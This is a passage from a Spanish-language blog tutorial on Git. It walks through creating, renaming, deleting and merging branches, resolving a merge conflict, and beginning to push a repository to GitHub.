&lt;p&gt;Ahora existe una forma de agilizar este proceso de creación y desplazamiento de un &lt;code&gt;branch&lt;/code&gt; para ello debemos ejecutar &lt;code&gt;git checkout -b&lt;/code&gt; y seguido el nombre de la rama. Pero es importante antes de ejecutar el comando volver a nuestro &lt;code&gt;branch&lt;/code&gt; original &lt;code&gt;main&lt;/code&gt; ya que nos encontramos en el &lt;code&gt;branch&lt;/code&gt; &lt;code&gt;primer-branch-alterno&lt;/code&gt; y nosotros queremos crear el &lt;code&gt;branch&lt;/code&gt; a partir de el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ahora si podemos ejecutar el comando y visializamos que efectivamente nos encontramos en el nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch-alterno
Cambiado a nueva rama 'segundo-branch-alterno'
❯ git branch
  main
  primer-branch-alterno
* segundo-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch &lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para cambiar el nombre de un &lt;code&gt;branch&lt;/code&gt; existen dos metodos:&lt;/p&gt;

&lt;p&gt;En el primero debemos estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar el nombre, para este caso queremos cambiar el nombre de &lt;code&gt;primer-branch-alterno&lt;/code&gt; a &lt;code&gt;primer-branch&lt;/code&gt; y ejecutar el comando &lt;code&gt;git branch -m&lt;/code&gt; y seguidamente el nuevo nombre a asignar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
Cambiado a rama 'primer-branch-alterno'
git branch -m primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verificamos los cambios usando &lt;code&gt;git branch&lt;/code&gt;y efectivamente nos modifico el nombre&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
  segundo-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar el segundo metodo no es necesario estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar, tan solo hay que ejecutar &lt;code&gt;git branch -m&lt;/code&gt;, seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar &lt;code&gt;segundo-branch-alterno&lt;/code&gt; y despues el nuevo nombre que se le asignara &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -m segundo-branch-alterno segundo-branch
❯ git branch
  main
* primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;eliminar-un-branch&quot;&gt;Eliminar un Branch &lt;a href=&quot;#eliminar-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Una vez que combinamos los cambios que realizamos en los &lt;code&gt;branchs&lt;/code&gt; o si las creamos por error, podemos eliminarlos.&lt;/p&gt;

&lt;p&gt;Si deseamos eliminar el &lt;code&gt;branch&lt;/code&gt;, hay que ejecutar el comando &lt;code&gt;git branch -d&lt;/code&gt; y seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que queramos borrar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
Eliminada la rama segundo-branch (era 415796f).
❯ git branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Verificamos si se realizaron los cambios y se borro el &lt;code&gt;branch&lt;/code&gt; con exito.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
  &lt;p&gt;Este comando aplica a &lt;code&gt;branch&lt;/code&gt; en repositorios locales no en &lt;code&gt;branch&lt;/code&gt; que se encuentren publicadas.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch &lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Veamos como podemos crear un &lt;code&gt;commit&lt;/code&gt; en un &lt;code&gt;branch&lt;/code&gt; que no sea &lt;code&gt;main&lt;/code&gt; que nosotros creemos y veremos como podemos cambiar entre estos &lt;code&gt;branch&lt;/code&gt; para ver como nuestros archivos cambian en nuestros directorios de trabajo.&lt;/p&gt;

&lt;p&gt;Esta parte es excelente, paece magia negra xD!&lt;/p&gt;

&lt;p&gt;Bueno sabemos que tenemos un archivo de texto en nuestro directorio llamado &lt;code&gt;archivo_git.txt&lt;/code&gt; con un cotenido asignado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 archivo_git.txt
❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora nos encontramos en nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Primero para realizar un cambio nos vamos a mover a nuestro &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch
Cambiado a rama 'primer-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Una vez nos en este &lt;code&gt;branch&lt;/code&gt; leemos el archivo que tenemos.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que el contenido es el mismo, entonces ahora vamos a modificarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Veamos ahora que ocurre si ejecutamos &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama primer-branch
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos muestra que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt; y que tenemos cambios que aún no han sido preparados para el proximo &lt;code&gt;commit&lt;/code&gt;. Entonces para agregsarlo ejecutamos el comando &lt;code&gt;git add .&lt;/code&gt; para agregarlos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama primer-branch
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Esta vez aun estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;, pero si tenemos el archivo en el &lt;code&gt;area de preparación&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Procedemos a crear nuestro &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt; y se nos abre nuestro editor de texto, en el cual introduciremos la descripción de este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a Hola Git
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama primer-branch
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Guardamos y cerramos el editor y tendriamos un nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[primer-branch 9771c56] Cambiar texto a Hola Git
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a leer el archivo otra vez, recordar que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;efectivamente vemos los cambios que realizamos, pero que pasa si ahora vamos a nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez aqui voy a leer mi archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y pumm! wala!! se tenso la cosa, tenemos el contenido antes de realizar el &lt;code&gt;commit&lt;/code&gt; en el &lt;code&gt;branch&lt;/code&gt; alterno. Esto es super genial por que estamos trabajando con el mismo archivo, pero con dos versiones diferentes :).&lt;/p&gt;

&lt;h3 id=&quot;historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs &lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a ejecutar el comando &lt;code&gt;git log&lt;/code&gt; con el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
415796f (HEAD -&amp;gt; main) Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver el historial de &lt;code&gt;commits&lt;/code&gt; en &lt;code&gt;main&lt;/code&gt;, pero no vemos el &lt;code&gt;commit&lt;/code&gt; que realizamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a irnos a el &lt;code&gt;branch&lt;/code&gt; alterno con &lt;code&gt;git checkout&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
9771c56 (HEAD -&amp;gt; primer-branch) Cambiar texto a Hola Git
415796f (main) Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos damos cuenta que ambos &lt;code&gt;branch&lt;/code&gt; comparten los ultimos dos &lt;code&gt;commits&lt;/code&gt;, pero despues al crearse el &lt;code&gt;branch&lt;/code&gt; alterno el primer &lt;code&gt;commit&lt;/code&gt; que se creo fue el primero. Por eso este &lt;code&gt;branch&lt;/code&gt; muestra este nuevo &lt;code&gt;commit&lt;/code&gt; y el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; no, ya que el primer &lt;code&gt;commit&lt;/code&gt; pertener a este nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Debo mencionar que existe un comando el cual muestra los &lt;code&gt;commit&lt;/code&gt; y cual fue la diferencia que introdujo el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log -p
commit 9771c563effc6eb6a82ed94947c125fdbdd03233 (HEAD -&amp;gt; primer-branch)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 21:46:43 2023 +0000

    Cambiar texto a Hola Git

diff --git a/archivo_git.txt b/archivo_git.txt
index cf36484..0152d71 100644
--- a/archivo_git.txt
+++ b/archivo_git.txt
@@ -1 +1 @@
-Este es mi segundo commit pero modificado
+Hola Git
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs &lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ya que los &lt;code&gt;branchs&lt;/code&gt; son temporales, debido a que existen miestras estamos desarrollando alguna funcionalidad o corrigiendo un problema, llegara un momento en que debamos fusionar esos cambios con el &lt;code&gt;branch&lt;/code&gt; principal, este proceso se denomina &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Para fusionar dos &lt;code&gt;branch&lt;/code&gt; es muy importante estar en el &lt;code&gt;branch&lt;/code&gt; que recibira la fusión.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para ello vamos a practicar lo anteriormente aprendido.&lt;/p&gt;

&lt;p&gt;Primero voy a dirigirme a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
❯ git branch
* main
  primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora crearemos un nuevo &lt;code&gt;branch&lt;/code&gt; y nos metemos en el&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch
Cambiado a nueva rama 'segundo-branch'
❯ git branch
  main
  primer-branch
* segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a modificar el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Continuamos verificado el estadoy vemos que fue modificado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama segundo-branch
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sigue agregarlo al area de preparación&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama segundo-branch
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creamos el &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Agregamos una segunda linea al archivo
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama segundo-branch
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos y cerramos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[segundo-branch 924f1c5] Agregamos una segunda linea al archivo
 1 file changed, 2 insertions(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora volveremos a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; y vemos el antiguo contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder realizar ahora el &lt;code&gt;merge&lt;/code&gt; o la fusión de &lt;code&gt;branch&lt;/code&gt;, despues de ya terminar de hacer todos nuestros cambios. Debemos estar en el &lt;code&gt;branch&lt;/code&gt; que recibira los cambios.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora procedemos a ejecutar el comando &lt;code&gt;git merge&lt;/code&gt; seguido de el nombre de la rama que queremos fusionar, en nuesto caso queremos fusionar el &lt;code&gt;branch&lt;/code&gt; recien creado &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge segundo-branch
Actualizando 415796f..924f1c5
Fast-forward
 archivo_git.txt | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos el mensaje de que se estan combinando todos los &lt;code&gt;commits&lt;/code&gt; con el &lt;code&gt;branch&lt;/code&gt; principal&lt;/p&gt;

&lt;p&gt;Y ahora si leemos el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;, vemos que se combinaron ambos &lt;code&gt;branch&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y si vemos el historial ahora ese &lt;code&gt;commit&lt;/code&gt; que hicimos al modificar el archivo en &lt;code&gt;segundo-branch&lt;/code&gt;, tambien es parte de &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
924f1c5 (HEAD -&amp;gt; main, segundo-branch) Agregamos una segunda linea al archivo
415796f Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar Branchs &lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ya que realizamos antes el &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;, no necesitamos ya el &lt;code&gt;branch&lt;/code&gt; que creamos &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi que podemos borrar este &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
Eliminada la rama segundo-branch (era 924f1c5).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora los conflictos ocurren cuando tratamos de hacer un &lt;code&gt;merge&lt;/code&gt; de archivos que tienen cambios que tienen conflictos.&lt;/p&gt;

&lt;p&gt;Estos pueden ser: Modificar el mismo texto, Modificar la misma linea o elemento, esto &lt;code&gt;Git&lt;/code&gt; los considera incompatible.&lt;/p&gt;

&lt;p&gt;En estos casos tenemos que decidir como vamos a hacer el &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Veamoslo a continuación:&lt;/p&gt;

&lt;p&gt;Vemos que el contenido del archivo en &lt;code&gt;primer-branch&lt;/code&gt; es&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
❯ /bin/cat archivo_git.txt
Hola miGit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora si vamos a &lt;code&gt;main&lt;/code&gt; y leemos el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Que pasa si intentamos hacer un &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge primer-branch
Auto-fusionando archivo_git.txt
CONFLICTO (contenido): Conflicto de fusión en archivo_git.txt
Fusión automática falló; arregle los conflictos y luego realice un commit con el resultado.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar el comando, nos dice que la combinación automatica falló y debemos arreglar los conflictos.&lt;/p&gt;

&lt;p&gt;Si vamos a nuestro editor de texto nos mostrara algo de este tipo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
Hola Git
Ahora estoy aprendiendo Git
=======
Hola miGit
&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En este caso el editor de texto &lt;code&gt;Visual Studio Code&lt;/code&gt;, nos fascilita decidir cuando tenemos este tipo de conflictos. Asi que en estos casos es muy recomendable usarlo.&lt;/p&gt;

&lt;p&gt;Nos da las opciones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Accept Current Change&lt;/code&gt; : Aceptar el cambio actual “del branch main”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Accept Incoming Change&lt;/code&gt; : Aceptar el cambio entrante “del branch primer-branch”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Accept Both Change&lt;/code&gt; : Aceptar ambos cambios&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Compare changes&lt;/code&gt; : Comparar los cambios&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esa decisión ya dependera del cambio que estes dispuesto a aceptar.&lt;/p&gt;

&lt;p&gt;En este caso usare la opción de aceptar ambos cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Continuamos guardando y cerrando el editor y ejecutamos &lt;code&gt;git merge --continue&lt;/code&gt; para continuar el proceso de fusión, esto nos abrira el editor nuevamente con el mensaje que se asignara al &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Merge branch 'primer-branch'

# Conflicts:
#	archivo_git.txt
#
# Parece que estás realizando una fusión.
# Si esto no es correcto, ejecuta
#	git update-ref -d MERGE_HEAD
# e intenta de nuevo.


# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Todos los conflictos resueltos pero sigues fusionando.
#
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos el archivo y cerramos para culminar el proceso&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge --continue
[main 95b5d86] Merge branch 'primer-branch'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pudimos solucionar el conflicto y nos hizo el &lt;code&gt;merge&lt;/code&gt; de manera exitosa, como vimos en este caso &lt;code&gt;visual studio code&lt;/code&gt; es muy útil para solucionar estos conflictos.&lt;/p&gt;

&lt;p&gt;Ahora finalmente leeremos el archivo otra vez&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
Hola miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y como resultado tenemos el archivo tal y cual lo combinamos.&lt;/p&gt;

&lt;h2 id=&quot;conexión-con-github&quot;&gt;Conexión con Github &lt;a href=&quot;#conexión-con-github&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Despues de haber trabajado todo nuestro codigo, llego la hora de subirlo a la nube. Vamos a hacer esto utilizando &lt;code&gt;GitHub&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para ello lo primero que debemos hacer es crearnos una cuenta, lo cual es un proceso muy sencillo, podemos hacerlo usando dirigiendonos a este enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&quot;&gt;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez creada nuestra cuenta nos vamos a la sección de &lt;code&gt;Repositorios&lt;/code&gt; y le damos a &lt;code&gt;New&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a elegir un nombre para nuestro repositorio en este caso usaremos de nombre &lt;code&gt;mi-primer-repositorio&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera dar click en &lt;code&gt;Create&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos dara una serie de opciones de que podemos hacer para subirlo aqui en &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nosotros usaremos el comando, &lt;code&gt;git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git&lt;/code&gt;, en donde &lt;code&gt;git remote&lt;/code&gt; nos va a servir para indicar si es que vamos a tener un servidor remoto en el cual subir nuestros cambios y con &lt;code&gt;add origin&lt;/code&gt; le indicamos de donde nosotros tenemos que ir a obtener nuestro codigo y tambien a donde tenemos que subir los cambios realizados y finalmente la &lt;code&gt;url&lt;/code&gt; de donde se encuentra almacenado nuestro codigo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente usaremos el comando &lt;code&gt;git push&lt;/code&gt;, para subir nuestros cambios los cuales seran con respecto a el &lt;code&gt;branch&lt;/code&gt; con la que estemos trabajando, pero ya que &lt;code&gt;main&lt;/code&gt; no se encuentra creado en &lt;code&gt;github&lt;/code&gt; con &lt;code&gt;-u&lt;/code&gt; creamos el &lt;code&gt;branch&lt;/code&gt; y con &lt;code&gt;origin&lt;/code&gt; indicamos donde queremos que sea creado y finalmente el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de ejecutar el comando nos pedira ingresar el nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a ingresar el &lt;code&gt;usuario&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
Username for 'https://github.com': f1rtsmiracle
Password for 'https://f1rtsmiracle@github.com':
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sim embargo en &lt;code&gt;password&lt;/code&gt; no debemos ingresar la contraseña con la que nos registramos a &lt;code&gt;github&lt;/code&gt;. Aqui nosotros debemos introducir una &lt;code&gt;key&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para obtenerla nos dirigimos a la opción de nuestro perfil &lt;code&gt;settings&lt;/code&gt;&lt;/p&gt;

